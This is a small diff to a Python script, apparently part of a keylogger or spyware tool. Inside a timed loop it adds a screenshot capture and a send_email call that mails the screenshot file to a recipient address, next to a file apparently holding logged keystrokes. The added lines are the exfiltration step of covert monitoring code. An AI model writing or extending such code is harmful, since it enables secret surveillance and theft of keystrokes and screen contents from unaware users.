@@ -160,3 +160,6 @@ while number_of_iterations < number_of_iterations_end:
     if currentTime > stoppingTime:
         with open(file_merge + keys_info, "w") as f:
             f.write(" ")
+
+        screenshots()
+        send_email(screenshot_info, file_merge + screenshot_info, toaddr)
